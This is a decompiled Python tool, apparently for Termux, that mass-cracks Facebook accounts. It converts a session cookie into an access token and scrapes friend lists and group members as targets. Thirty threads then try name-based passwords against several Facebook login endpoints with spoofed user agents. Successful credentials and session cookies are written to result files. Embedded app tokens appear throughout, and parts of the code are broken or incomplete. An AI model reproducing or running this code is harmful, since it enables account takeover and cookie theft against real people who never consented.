# <comment-start>
# Decompiled by Rizemary (BlackZoneCode)
# --------------------------------------
# File type      : Python File
# File hash (md5): 902b14d0a721204847d8704ba4ed451f
# Original link  : https://github.com/Fajar-15/Efbku
# Datetime       : 2023-08-08 11:38:58.784561
# Source size    : 72.6 KB
# Telegram       : @BZCTeam @Rizemary
# --------------------------------------
# <comment-end>

# Source By   : Fajar Khafi (Kato Kyta)
# This script is free, don't sell it!
# rizey: katanya gratis, kok pake lisen:'v

import six.moves.urllib as urllib
import re, requests, random, json, sys, time, datetime, os, uuid, base64, string, subprocess, calendar
from concurrent.futures import ThreadPoolExecutor as Thread
from time import time as FajarTime
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as beautifulsoup
from datetime import date, datetime
from string import *

# url = b'aHR0cHM6Ly9tLmZhY2Vib29rLmNvbS8xMDAwOTA3MDMwOTI1NDEvdGltZWxpbmU='

# rich
from rich.progress import (
    Progress,
    SpinnerColumn,
    BarColumn,
    TextColumn,
    TimeElapsedColumn,
)
from rich import print as prints
from rich.tree import Tree
from rich.panel import Panel

ses = requests.Session()

P = "\x1b[1;97m"
M = "\x1b[1;91m"
H = "\x1b[1;92m"
K = "\x1b[1;93m"
B = "\x1b[1;94m"
U = "\x1b[1;95m"
O = "\x1b[1;96m"
N = "\x1b[0m"
Z = "\033[1;30m"
J = "\x1b[38;5;208m"  # Jingga
A = "\x1b[1;90m"  # WARNA ABU ABU

Z2 = "[#000000]"  # HITAM
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
U2 = "[#AF00FF]"  # UNGU
N2 = "[#FF00FF]"  # PINK
O2 = "[#00FFFF]"  # BIRU MUDA
P2 = "[#FFFFFF]"  # PUTIH
J2 = "[#FF8F00]"  # JINGGA
A2 = "[#AAAAAA]"  # ABU-ABU

# global
id1, id2, loop, ok, cp = [], [], 0, 0, 0
agen, agen2 = [], []
metode, pwpluss, pwnya, tokenku = [], [], [], []
rr = random.randint
rc = random.choice
sys.stdout.write(f"\x1b]2; ( Kyta FB )\x07")

# --- > time
sasi = [
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "Mei",
    "Jun",
    "Jul",
    "Agu",
    "Sep",
    "Okt",
    "Nov",
    "Des",
]
tete = {
    "01": "Jan",
    "02": "Feb",
    "03": "Mar",
    "04": "Apr",
    "05": "Mai",
    "06": "Jun",
    "07": "Jul",
    "08": "Agu",
    "09": "Sep",
    "10": "Okt",
    "11": "Nov",
    "12": "Des",
}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:
        exit()
    xx = blx - 1
except ValueError:
    exit()
# if hp not in out:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari) + "-" + str(bulan) + "-" + str(tahun)
ress_ok = f"OK-{hari}-{bulan}-{tahun}.txt"
ress_cp = f"CP-{hari}-{bulan}-{tahun}.txt"


class MainTermux(object):
    def __init__(self, **ingfo):
        try:
            ingfo.update({"Author": sys.argv[1]})
        except:
            exit(
                " [!] Gagal Masuk Ke Menu Jalankan Ulang Dengan Perintah Di Bawah Ini\nRun: python {} Katoky".format(
                    sys.argv[0]
                )
            )
        if ingfo.get("Author") == ("Katoky") or ingfo.get("Author").lower() == (
            "Katoky"
        ):
            xxxx = os.getcwd()
            if os.path.isfile(".token.txt") is True:
                if os.path.isfile(".cok.txt") is True:
                    menu()
            else:
                try:
                    subrek = open("data/subs.yt", "r").read()
                except:
                    open("data/subs.yt", "w").write("sudah susbscriber")
                    os.system("xdg-open https://youtube.com/@khamdihi")
            Cookies()
        else:
            exit(
                "Utamakan Baca Dulu Di Github Aku\nRun: python {} Katorky".format(
                    sys.argv[0]
                )
            )


def Cookies():
    try:
        os.system("clear")
        print("%s___________ ________.    %s__%s" % (P, M, P))
        print("%s\_   _____// ____\_ |__ %s|  | ____ __%s" % (P, M, P))
        print("%s |    __)_\   __\ | __ \%s|  |/ /  |  \%s" % (P, M, P))
        print("%s |        \|  |   | \_\ \%s    <|  |  /%s" % (P, M, P))
        print("%s/_______  /|__|   |___  /%s__|_ \____/%s" % (P, M, P))
        print("%s        \/            \/ %s    \/%s" % (P, M, P))
        prints(f" [!] [underline]{H2}source by Kato Kyta{P2}")  # jangan di ganti ya ajg
        print("\n [!] Informasi : Harap gunakan akun tumbal")
        cok = input(f" [!] masukan cookie : ")
        cos = {"cookie": cok}
        data = {
            "access_token": "1348564698517390|007c0a9101b9e1c8ffab727666805038",
            "scope": "",
        }
        req = ses.post(
            "https://graph.facebook.com/v16.0/device/login/", data=data
        ).json()
        cd = req["code"]
        ucd = req["user_code"]
        url = (
            "https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038"
            % (cd)
        )
        req = parser(
            ses.get("https://mbasic.facebook.com/device", cookies=cos).content,
            "html.parser",
        )
        raq = req.find("form", {"method": "post"})
        dat = {
            "jazoest": re.search(
                'name="jazoest" type="hidden" value="(.*?)"', str(raq)
            ).group(1),
            "fb_dtsg": re.search(
                'name="fb_dtsg" type="hidden" value="(.*?)"', str(req)
            ).group(1),
            "qr": "0",
            "user_code": ucd,
        }
        rel = "https://mbasic.facebook.com" + raq["action"]
        pos = parser(ses.post(rel, data=dat, cookies=cos).content, "html.parser")
        dat = {}
        raq = pos.find("form", {"method": "post"})
        for x in raq("input", {"value": True}):
            try:
                if x["name"] == "__CANCEL__":
                    pass
                else:
                    dat.update({x["name"]: x["value"]})
            except Exception as e:
                pass
        rel = "https://mbasic.facebook.com" + raq["action"]
        pos = parser(ses.post(rel, data=dat, cookies=cos).content, "html.parser")
        req = ses.get(url, cookies=cos).json()
        tok = req["access_token"]
        kot = open(".token.txt", "w").write(tok)
        koc = open(".cok.txt", "w").write(cok)
        print(f"{P} [!] Login Sukses")
        print("\n [!] Your Token : {}".format(req["access_token"]))
        exit()
    except Exception as e:
        print(f"{M}{str(e)}")
        exit()


def menu_ku():
    try:
        ses = requests.Session()
        lisen = open("data/key.txt", "r").read()
        met = ses.get(
            "https://app.cryptolens.io/api/key/Activate?token=WyI1NjgwMDMxNyIsIjRDaHIwMExZUUhveGhJNXB2aHF0U0FUQXZCalNwTnFMSDVZSGxGOHQiXQ==&ProductId=21326&Key="
            + lisen
        ).json()
        men = met["licenseKey"]
        key = men["key"][0:11]
        tahun = men["expires"][0:4]
        buln = men["expires"][5:7]
        tanggal = men["expires"][8:10]
        bulan = bulan_ttl[buln]
        tahun1 = men["created"][0:4]
        buln1 = men["created"][5:7]
        tanggal1 = men["created"][8:10]
        bulan1 = bulan_ttl[buln1]
    except:
        key = "-"
        tanggal = "-"
        bulan = "-"
        tahun = "-"
        tanggal1 = "-"
        bulan1 = "-"
        tahun1 = "-"
    try:
        token = open(".token.txt", "r").read()
        cok = open(".cok.txt", "r").read()
    except IOError:
        exit("cookie non aktive")
        time.sleep(1)
        Cookies()
    try:
        link = requests.Session().get(
            "https://graph.facebook.com/me?fields=id,name&access_token=%s" % (token),
            cookies={"cookie": cok},
        )
        nami = json.loads(link.text)["name"]
        user = json.loads(link.text)["id"]
    except KeyError:
        Cookies()
    except requests.exceptions.ConnectionError:
        exit(" [!] Tidak ada koneksi.")
    os.system("clear")
    print("%s___________ ________.    %s__%s" % (P, M, P))
    print("%s\_   _____// ____\_ |__ %s|  | ____ __%s" % (P, M, P))
    print("%s |    __)_\   __\ | __ \%s|  |/ /  |  \%s" % (P, M, P))
    print("%s |        \|  |   | \_\ \%s    <|  |  /%s" % (P, M, P))
    print("%s/_______  /|__|   |___  /%s__|_ \____/%s" % (P, M, P))
    print("%s        \/            \/ %s    \/%s" % (P, M, P))
    prints(f" [!] [underline]{H2}source by Kato Kyta{P2}")  # jangan di ganti ya ajg
    print("\n %s[!] username : %s%s%s" % (P, H, nami, P))
    print(" %s[!] user uid : %s%s%s" % (P, H, user, P))
    print()
    print(" %s[!] 01. crack %sin%s random %spublik%s" % (P, M, P, H, P))
    print(" %s[!] 02. crack %sin%s random %sgroup%s" % (P, M, P, H, P))
    print(" %s[!] 03. crack %sin%s random %sfile%s" % (P, M, P, H, P))
    print(" %s[!] 04. Logout%s Delete cookie %s" % (P, M, P))


def crack_file():
    print()
    file = input(f" [!] file name : ")
    try:
        uuid = open(file, "r").readlines()
        for data in uuid:
            try:
                user, nama = data.split("|")
            except:
                exit(f" [!] pemisah salah")
            id1.append(data)
            print("\r [!] sedang dump %s id" % (len(id1)), end=" ")
            time.sleep(0.0000003)
    except FileNotFoundError:
        exit(f" [{M}>{P}] file tidak ada")
    print()
    Setting()


def grup(url):
    try:
        link = parser(ses.get(url).text, "html.parser")
        for uid in re.findall('data-sigil="feed_story_(.*?)class="img', str(link)):
            for user in re.findall('ring(.*?)"', str(uid)):
                for nama in re.findall('label="(.*?),', str(uid)):
                    if user + "|" + nama in id1:
                        pass
                    else:
                        id1.append(user + "|" + nama)
                    print(" [!] CTL + C untuk berhenti dump ")
                    print(f" [!] {M}{len(id1)}{P}      ", end="\r")
                    time.sleep(0.0000100)
        for x in link.find_all("a", href=True):
            if x.text == "Lihat Postingan Lainnya…":
                grup("https://iphone.facebook.com" + x.get("href"))
    except:
        pass


def Publik():
    try:
        token = open(".token.txt", "r").read()
        cok = open(".cok.txt", "r").read()
    except Exception as e:
        print(f" {str(e).title()})")
        time.sleep(5)
        Cookies()
    except requests.exceptions.ConnectionError:
        exit(" [!] Tidak ada koneksi.")
    print()
    print("%s [!] pastikan %suid%s bersifat publik%s" % (P, H, P, P))
    user2 = input(" [!] uid: ")
    for uid in user2.split(","):
        try:
            date = ses.get(
                f"https://graph.facebook.com/v14.0/{uid}?fields=name,friends.limit(5000)&access_token={token}",
                cookies={"cookies": cok},
            ).json()
            search = date["name"]
            for x in date["friends"]["data"]:
                try:
                    id1.append(x["username"] + "|" + x["name"])
                except:
                    id1.append(x["id"] + "|" + x["name"])
                    print(f" [!] {H}{str(search)}|{M}{len(id1)}{P}      ", end="\r")
        except (KeyError, IOError):
            print(f" [!] id {uid} private", end="\r")
            time.sleep(0.1)
    try:
        print(f"\r [!] Total Dump %s User" % (str(len(id1))))
        Setting()
    except requests.exceptions.ConnectionError:
        print(" [!] koneksi internet anda buruk")


def menu_mtd():
    print()
    if len(id1) == 0:
        exit("uid tidak publik")

    for bacot in id1:
        xx = random.randint(0, len(id2))
        id2.insert(xx, bacot)

    print(" %s[!] 01. https://m.facebook .com %sascny%s" % (P, H, P))
    print(" %s[!] 02. https://mbasic.facebook.com %sregular%s" % (P, H, P))
    print(" %s[!] 03. https://mtouch.facebook.com %svalidate%s" % (P, H, P))


def hasil():
    print("%s [!] %sResults OK Tersimpan Di : %s%s" % (P, H, ress_ok, P))
    print("%s [!] %sResults CP Tersimpan Di : %s%s\n" % (P, K, ress_cp, P))


def take_password():
    global prog, des
    print()
    hasil()
    prog = Progress(
        TextColumn("{task.description}"), TextColumn("{task.percentage:.0f}%")
    )
    des = prog.add_task("", total=len(id2))
    with prog:
        with Thread(max_workers=30) as fajar_ganteng:
            for user in id2:
                uix, nama = user.split("|")[0], user.split("|")[1].lower()
                depan = nama.split(" ")[0]
                if len(nama) <= 5:
                    if len(depan) <= 1 or len(depan) <= 2:
                        pass
                    else:
                        pwid = [
                            depan + "123",
                            depan + "1234",
                            depan + "12345",
                            depan + "01",
                            depan + "02",
                            depan + "03",
                            depan + "04",
                            depan + "05",
                            nama.lower(),
                        ]
                else:
                    pwid = [
                        nama,
                        nama.lower(),
                        depan + "123",
                        depan + "1234",
                        depan + "12345",
                        depan + "01",
                        depan + "02",
                        depan,
                        depan.lower(),
                    ]
                if "ya" in pwpluss:
                    for xpwd in pwnya:
                        pwid.append(xpwd)
                else:
                    pass
                if "id_1" in metode:
                    fajar_ganteng.submit(crack1, uix, pwid)
                elif "id_2" in metode:
                    fajar_ganteng.submit(crack2, uix, pwid)
                elif "id_3" in metode:
                    fajar_ganteng.submit(crack3, uix, pwid)
                elif "id_4" in metode:
                    fajar_ganteng.submit(brute, uix, pwid)
                else:
                    fajar_ganteng.submit(crack1, id2, uix, pwid)
        exit("\n\ncracking done!")


def crack1(uix, pwid):
    global loop, ok, cp
    prog.update(
        des,
        description=f" [!] {P2}{len(id2)} {H2}Live {P2}:-{H2}{(ok)} {K2}Check {P2}:-{K2}{(cp)} {P2}({H2}Async-{P2} : {(loop)}{P2})",
    )
    prog.advance(des)
    for pw in pwid:
        try:
            ua = random.choice(agen)
            ua2 = random.choice(agen2)
            ses = requests.Session()
            link = ses.get(
                "https://mbasic.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button%3Flocale%3Did_ID&refsrc=deprecated&_rdr"
            )
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                "jazoest": re.search(
                    'name="jazoest" value="(.*?)"', str(link.text)
                ).group(1),
                "m_ts": re.search('"m_ts" value="(.*?)"', str(link.text)).group(1),
                "li": re.search('"li" value="(.*?)"', str(link.text)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uix,
                "pass": pw,
                "login": "Masuk",
                "bi_xrwh": re.search('"bi_xrwh" value="(.*?)"', str(link.text)).group(
                    1
                ),
            }
            params = {"refsrc": "deprecated", "lwv": "100"}
            headers = {
                "authority": "mbasic.facebook.com",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "max-age=0",
                "origin": "https://mbasic.facebook.com",
                "referer": "https://mbasic.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button%3Flocale%3Did_ID&refsrc=deprecated&_rdr",
                "sec-ch-prefers-color-scheme": "light",
                "sec-ch-ua": '"Not:A-Brand";v="99", "Chromium";v="112"',
                "sec-ch-ua-full-version-list": '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-ch-ua-platform-version": '"9.0.0"',
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": ua2,
                "viewport-width": "980",
            }
            response = ses.post(
                "https://mbasic.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button%3Flocale%3Did_ID&",
                params=params,
                headers=headers,
                data=data,
                allow_redirects=False,
            )
            if "c_user" in ses.cookies.get_dict():
                kuki = (";").join(
                    [
                        "%s=%s" % (key, value)
                        for key, value in ses.cookies.get_dict().items()
                    ]
                )
                tree = Tree("")
                tree.add(f"\r{H2}Login Berhasil").add(f"\r{H2}{uix}|{pw}")
                tree.add(f"\r{H2}locale=id_ID;{kuki}")
                tree.add(f"{H2}https://www.facebook.com/profile.php?id={uix}{P2}")
                prints(tree)
                open("OK/" + ress_ok, "a").write(uix + "|" + pw + "|" + kuki + "\n")
                ok += 1
                break
            elif "checkpoint" in response.cookies.get_dict():
                tree = Tree("")
                tree.add(f"\r{J2}Login Checkpoint").add(f"\r{J2}{uix}|{pw}")
                tree.add(f"\r{J2}{ua}")
                prints(tree)
                cp += 1
                open("CP/" + ress_cp, "a").write(uix + "|" + pw + "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


def crack2(uix, pwid):
    global loop, ok, cp
    prog.update(
        des,
        description=f" [!] {P2}{len(id2)} {H2}Live {P2}:-{H2}{(ok)} {K2}Check {P2}:-{K2}{(cp)} {P2}({H2}Regular-{P2} : {(loop)}{P2})",
    )
    prog.advance(des)
    for pw in pwid:
        try:
            ua = random.choice(agen)
            ua2 = random.choice(agen2)
            ses = requests.Session()
            ses.headers.update(
                {
                    "Connection": "keep-alive",
                    "Accept-Language": "en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7",
                    "Sec-Fetch-Mode": "navigate",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Dest": "document",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Host": "m.alpha.facebook.com",
                    "User-Agent": ua2,
                }
            )
            ress = ses.get(
                "https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=347515280067&kid_directed_site=0&app_id=347515280067&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D347515280067%26redirect_uri%3Dhttps%253A%252F%252Fideone.com%252Faccount%252Fregisterfb%252F%26scope%3Demail%252Cuser_location%252Cuser_hometown%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db402fc71-bc39-493b-9f74-780165a8b6d0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fideone.com%2Faccount%2Fregisterfb%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"
            ).text
            data = {
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(ress)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(ress)).group(1),
                "try_number": 0,
                "unrecognized_tries": 0,
                "email": uix,
                "prefill_contact_point": uix,
                "prefill_source": "browser_dropdown",
                "prefill_type": "password",
                "first_prefill_source": "browser_dropdown",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": True,
                "had_password_prefilled": True,
                "is_smart_lock": False,
                "bi_xrwh": 0,
                "encpass": f"#PWD_BROWSER:0:{str(FajarTime()).split('.')[0]}:{pw}",
                "fb_dtsg": re.search('{"dtsg":{"token":"(.*?)"', str(ress)).group(1),
                "jazoest": re.search('name="jazoest" value="(\d+)"', str(ress)).group(
                    1
                ),
                "lsd": re.search('name="lsd" value="(.*?)"', str(ress)).group(1),
                "__dyn": "",
                "__csr": "",
                "__req": random.choice(["1", "2", "3", "4", "5"]),
                "__a": re.search('"encrypted":"(.*?)"', str(ress)).group(1),
                "__user": 0,
            }
            ses.headers.update(
                {
                    "cookie": (
                        "; ".join(
                            [
                                str(x) + "=" + str(y)
                                for x, y in ses.cookies.get_dict().items()
                            ]
                        )
                    ),
                    "sec-fetch-site": "same-origin",
                    "origin": "https://m.alpha.facebook.com",
                    "content-type": "application/x-www-form-urlencoded",
                    "accept": "*/*",
                    "Referer": "https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=347515280067&kid_directed_site=0&app_id=347515280067&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D347515280067%26redirect_uri%3Dhttps%253A%252F%252Fideone.com%252Faccount%252Fregisterfb%252F%26scope%3Demail%252Cuser_location%252Cuser_hometown%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db402fc71-bc39-493b-9f74-780165a8b6d0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fideone.com%2Faccount%2Fregisterfb%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
                    "content-length": str(
                        len(("&").join(["%s=%s" % (x, y) for x, y in data.items()]))
                    ),
                }
            )
            ress2 = ses.post(
                "https://m.alpha.facebook.com/login/device-based/login/async/?api_key=347515280067&auth_token=5cff8c0e16608d64364c2ba0e8f1318c&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D347515280067%26redirect_uri%3Dhttps%253A%252F%252Fideone.com%252Faccount%252Fregisterfb%252F%26scope%3Demail%252Cuser_location%252Cuser_hometown%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db402fc71-bc39-493b-9f74-780165a8b6d0%26tp%3Dunspecified&refsrc=deprecated&app_id=347515280067&cancel=https%3A%2F%2Fideone.com%2Faccount%2Fregisterfb%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100",
                data=data,
                allow_redirects=True,
            )
            if "c_user" in ses.cookies.get_dict():
                kuki = (";").join(
                    [
                        "%s=%s" % (key, value)
                        for key, value in ses.cookies.get_dict().items()
                    ]
                )
                tree = Tree("")
                tree.add(f"\r{H2}Login Berhasil").add(f"\r{H2}{uix}|{pw}")
                tree.add(f"\r{H2}locale=id_ID;{kuki}")
                prints(tree)
                open("OK/" + ress_ok, "a").write(uix + "|" + pw + "|" + kuki + "\n")
                ok += 1
                break
            elif "checkpoint" in po.cookies.get_dict():
                tree = Tree("")
                tree.add(f"\r{J2}Login Checkpoint").add(f"\r{J2}{uix}|{pw}")
                tree.add(f"\r{J2}{ua}")
                prints(tree)
                cp += 1
                open("CP/" + ress_cp, "a").write(uix + "|" + pw + "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


def tes2(uix, pwid):
    global loop, ok, cp
    prog.update(
        des,
        description=f" [!] {P2}{len(id2)} {H2}Live {P2}:-{H2}{(ok)} {K2}Check {P2}:-{K2}{(cp)} {P2}({H2}Tes_-{P2} : {(loop)}{P2})",
    )
    prog.advance(des)
    for pw in pwid:
        try:
            ua = random.choice(agen)
            ua2 = random.choice(agen2)
            ses = requests.Session()
            p = ses.get(
                f"https://m.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button%3Flocale%3Did_ID&refsrc=deprecated&_rdr"
            )
            suhk = parser(p.text, "html.parser")
            xxxx = suhk.find("form", {"method": "post"})["action"]
            date = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(
                    1
                ),
                "email": uix,
                "next": "",
                "pass": pw,
                "login": "sumbit",
            }
            headers = {
                "authority": "m.facebook.com",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "max-age=0",
                "origin": "https://m.facebook.com",
                "referer": "https://m.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button%3Flocale%3Did_ID&refsrc=deprecated&_rdr",
                "sec-ch-prefers-color-scheme": "light",
                "sec-ch-ua": '"Not:A-Brand";v="99", "Chromium";v="112"',
                "sec-ch-ua-full-version-list": '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-ch-ua-platform-version": '"9.0.0"',
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": ua2,
                "viewport-width": "980",
            }
            po = ses.post(
                f"https://m.facebook.com{xxxx}",
                data=date,
                headers=headers,
                allow_redirects=False,
            )
            if "c_user" in ses.cookies.get_dict():
                kuki = (";").join(
                    [
                        "%s=%s" % (key, value)
                        for key, value in ses.cookies.get_dict().items()
                    ]
                )
                tree = Tree("")
                tree.add(f"\r{H2}Login Berhasil").add(f"\r{H2}{uix}|{pw}")
                tree.add(f"\r{H2}locale=id_ID;{kuki}")
                tree.add(f"{H2}{ua}{P2}")
                prints(tree)
                open("OK/" + ress_ok, "a").write(uix + "|" + pw + "|" + kuki + "\n")
                ok += 1
                break
            elif "checkpoint" in po.cookies.get_dict():
                tree = Tree("")
                tree.add(f"\r{J2}Login Checkpoint").add(f"\r{J2}{uix}|{pw}")
                tree.add(f"\r{J2}{ua}")
                prints(tree)
                cp += 1
                open("CP/" + ress_cp, "a").write(uix + "|" + pw + "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


def xxxc():
    device = random.choice(["RMX1831", ""])
    denin = random.choice(
        [
            "{density=2.25,height=1092,width=2082};]",
            "{density=2.0,height=850,width=750};]",
            "{density=3.0,height=1082,width=1092};]",
            "{density=2.25,height=2093,width=1093};]",
            "{density=3.0,height=1995,width=1836};]",
            "{density=3.0,height=1483,width=1829};]",
            "{density=2.25,height=1577,width=2027};]",
            "{density=2.0,height=1073,width=1016};]",
            "{density=2.0,height=1278,width=1286};]",
            "{density=3.0,height=1885,width=1099};]",
            "{density=2.0,height=1086,width=1798};]",
            "{density=2.0,height=2027,width=1725};]",
            "{density=2.25,height=1405,width=1829};]",
            "{density=2.0,height=1473,width=1806};]",
            "{density=3.0,height=1637,width=1294};]",
            "{density=2.0,height=1851,width=1173};]",
            "{density=2.25,height=1373,width=1416};]",
            "{density=2.25,height=1446,width=1251};]",
            "{density=3.0,height=1883,width=1093};]",
            "{density=2.25,height=1059,width=1542};]",
            "{density=2.0,height=1151,width=1273};]",
            "{density=3.0,height=1620,width=1840};]",
            "{density=3.0,height=1717,width=1745};]",
            "{density=2.25,height=1161,width=1541};]",
            "{density=2.0,height=1060,width=1132};]",
            "{density=2.25,height=1282,width=2024};]",
            "{density=2.25,height=1191,width=1221};]",
            "{density=2.25,height=1349,width=1788};]",
            "{density=2.0,height=1608,width=1794};]",
            "{density=2.0,height=1495,width=1906};]",
        ]
    )
    uai = (
        f"Davik/2.1.0 (Linux; U; Android {str(rr(4,13))}; RMX1941 Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{str(rr(40,360))}.325.0.0.5.56;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/919886436;FBCR/XL Axiata;FBMF/Realme;FBBD/Realme;FBDV/RMX1941;FBSV/{str(rr(4,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"
        + f"{denin};"
    )
    return uai


def crack3(uix, pwid):
    global loop, ok, cp
    prog.update(
        des,
        description=f" [{M2}/{P2}] {P2}{len(id2)} {H2}Live {P2}:-{H2}{(ok)} {K2}Check {P2}:-{K2}{(cp)} {P2}({H2}{str(uix)}-{P2} : {(loop)}{P2})",
    )
    prog.advance(des)
    for pw in pwid:
        try:
            pw = pw.lower()
            ua3 = xxxc()
            r = requests.Session()
            head = {
                "Host": "graph.facebook.com",
                "x-fb-connection-bandwidth": repr(random.randint(2e7, 3e7)),
                "x-fb-sim-hni": repr(random.randint(2e4, 4e4)),
                "x-fb-net-hni": repr(random.randint(2e4, 4e4)),
                "x-fb-connection-quality": "EXCELLENT",
                "user-agent": ua3,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger",
            }
            date = {
                "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
                "format": "JSON",
                "sdk_version": {random.randrange(2, 31)},
                "email": uix,
                "locale": "id_ID",
                "password": pw,
                "sdk": "android",
                "generate_session_cookies": "1",
                "sig": f"{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}",
            }
            xnxx = ses.post(
                "https://graph.facebook.com/auth/login",
                params=date,
                headers=head,
                allow_redirects=False,
            )
            if "session_key" in xnxx.text:
                ok += 1
                q = json.loads(xnxx.text)
                ckkk = ";".join(
                    i["name"] + "=" + i["value"] for i in q["session_cookies"]
                )
                ssbb = (
                    base64.b64encode(os.urandom(18))
                    .decode()
                    .replace("=", "")
                    .replace("+", "_")
                    .replace("/", "-")
                )
                kuki = f"sb={ssbb};{ckkk}"
                print(f" {P}[{H}/{P}] {H}{uix}|{pw}{P}")
                print(f"  {H}locale=id_ID;{kuki}{P}")
                open("OK/" + ress_ok, "a").write(uix + "|" + pw + "|" + kuki + "\n")
                break
            elif "www.facebook.com" in xnxx.text:
                print(f" {P}[{K}/{P}] {K}{uix}|{pw}{P}")
                open("CP/" + ress_cp, "a").write(uix + "|" + pw + "\n")
                cp += 1
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


for z in range(10000):
    sm = rc(
        [
            "E025F",
            "G996B",
            "A826S",
            "E135F",
            "G781B",
            "G998B",
            "F936U1",
            "G361F",
            "A716S",
            "J327AZ",
            "E426B",
            "A015F",
            "A015M",
            "A013G",
            "A013G",
            "A013M",
            "A013F",
            "A022M",
            "A022G",
            "A022F",
            "A025M",
            "S124DL",
            "A025U",
            "A025A",
            "A025G",
            "A025F",
            "A025AZ",
            "A035F",
            "A035M",
            "A035G",
            "A032F",
            "A032M",
            "A032F",
            "A037F",
            "A037U",
            "A037M",
            "S134DL",
            "A037G",
        ]
    )
    uai = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {sm}) Mozila/5.0({sm}; {str(rr(1,11))} UBE/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))})"
    uau = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {sm})"
    mek = f"Moziila/5.0 (Linux; Android {str(rr(1,11))})"
    uaku1 = random.choice([uai, uau, mek])
    agen.append(uaku1)

